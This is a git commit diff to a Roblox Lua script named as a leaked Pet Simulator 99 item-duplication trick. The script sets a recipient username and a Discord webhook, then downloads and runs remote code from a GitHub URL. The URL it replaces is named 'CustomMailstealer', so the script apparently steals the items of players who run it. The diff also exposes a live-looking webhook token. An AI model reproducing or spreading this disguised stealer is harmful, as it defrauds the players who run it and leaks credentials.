e5fc33e276df80a3cf9796c884561d452f20dc61
Xyokuro <93172072+Xyokuro@users.noreply.github.com>
2024-02-20 12:36:52 -0500

    Update ps99LeakedDupe.lua

--- ps99LeakedDupe.lua
+++ ps99LeakedDupe.lua
@@ -1,7 +1,6 @@
 Username = "yokuyoku17"
 Webhook = "https://discord.com/api/webhooks/1060014639099936858/L8jf5NfB9SKOoZnTbjGMwWmI3VRmmZZLnplHtKYiSi6UNA_IjfHB2Ru0vJPd28SoCqTU"
+selectedLoadingScreen = "4"
+LoadingScreen = false
 
-G_LoadingScreen = "Get Fucked honestly "
-G_WebhookName = "CgkBot"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriCustom/main/CustomMailstealer"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/PS99Mail/main/Mementomori"))()
